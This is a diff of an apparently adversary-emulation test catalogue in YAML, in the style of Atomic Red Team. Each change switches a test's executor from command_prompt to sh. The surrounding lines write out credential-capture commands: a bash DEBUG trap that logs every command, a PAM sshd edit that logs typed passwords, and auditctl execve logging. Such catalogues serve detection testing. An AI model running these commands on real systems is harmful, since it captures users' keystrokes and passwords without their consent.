@@ -2853,7 +2853,7 @@ credential-access:
           type: String
           default: "/tmp/.keyboard.log"
       executor:
-        name: command_prompt
+        name: sh
         elevation_required: false
         command: |
           trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> #{output_file}' DEBUG
@@ -2889,7 +2889,7 @@ credential-access:
           type: String
           default: ubuntu
       executor:
-        name: command_prompt
+        name: sh
         elevation_required: true
         command: "cp -v /etc/pam.d/sshd /tmp/\necho >> \"session required pam_tty_audit.so
           disable=* enable=* open_only log_passwd\"\nsystemctl restart sshd\nsystemctl
@@ -2917,7 +2917,7 @@ credential-access:
 
 '
       executor:
-        name: command_prompt
+        name: sh
         elevation_required: true
         command: "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl
           -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start
@@ -8762,7 +8762,7 @@ collection:
           type: String
           default: "/tmp/.keyboard.log"
       executor:
-        name: command_prompt
+        name: sh
         elevation_required: false
         command: |
           trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> #{output_file}' DEBUG
@@ -8798,7 +8798,7 @@ collection:
           type: String
           default: ubuntu
       executor:
-        name: command_prompt
+        name: sh
         elevation_required: true
         command: "cp -v /etc/pam.d/sshd /tmp/\necho >> \"session required pam_tty_audit.so
           disable=* enable=* open_only log_passwd\"\nsystemctl restart sshd\nsystemctl
@@ -8826,7 +8826,7 @@ collection:
 
 '
       executor:
-        name: command_prompt
+        name: sh
         elevation_required: true
         command: "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl
           -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start
